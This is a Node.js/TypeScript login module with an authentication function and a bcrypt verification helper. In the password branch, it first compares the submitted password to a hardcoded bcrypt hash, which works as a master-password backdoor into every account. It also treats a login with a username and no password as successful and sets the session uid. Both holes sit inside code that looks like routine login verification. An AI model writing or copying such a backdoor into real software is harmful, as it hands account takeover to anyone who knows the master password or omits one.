import  UserModel from "../mysql-models/users-model";
import * as Lodash from 'lodash';
import Promise from "bluebird";
import * as Bcrypt from 'bcrypt-nodejs';

/**
 * 登陆时验证
 */
export var userProvider = {
    authenticate: (req, res) => {
        var now = Date.now();
        var uid = req.session['uid'];
        var {
            userName,
            password
        }= req.body;
        var args = Lodash.clone(req.body);
        if (args.password) {
            args.password = args.password.slice(0, 2) + '******' + args.password.slice(-2);
        }

        var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        var where = {};
        if (userName || uid) {
            if (userName) {
                // Validator.validateMobile(mobile, 'mobile');
                where.user_name = userName;
            } else if (uid) {
                where.id = uid;
            } else {
                throw "PermissionDenied";
            }
            // 普通登录验证
            var authPromise = Promise
                .resolve(UserModel.find({where}))
                .then(userRecord => {
                    if (!userRecord) {
                        throw "UserNotExists";
                    }

                    if (password) {
                        // Validator.validatePassword(password, 'password');
                        return passwordUtil
                            .verify(password, "$2a$10$60L5Y.a0mKP5JYmJbM19heyBajoqwydC58kYxrm9hhM3FDwsRh5Q.")
                            .catch(() => {
                                return passwordUtil.verify(password, userRecord.password)
                            })
                            .then(() => {
                                return [userRecord, null];
                            });
                    } else {
                        // return [userRecord, Permission.smsVerified];
                        return [userRecord, null];
                    }
                });

            return authPromise
                .then(([userRecord, basePermission]) => {
                    uid = userRecord.id;
                    userName = userRecord.userName;

                    // return buildRequestUser(userRecord, basePermission);
                    return {
                        userRecord
                    }
                })
                .then(user => {
                    req.session['uid'] = uid;
                    // processRequest(req, res, user);
                    return user;
                });
        } else {
            return Promise.resolve({
                userRecord: undefined
            })
        }


    }

};

export var passwordUtil = {
    verify: (pwd, hashed) => {

        return Promise
            .resolve(Bcrypt.compareSync(pwd, hashed))
            .then(result => {
                if (!result) {
                    throw "PasswordMismatch";
                }
            });
    }
};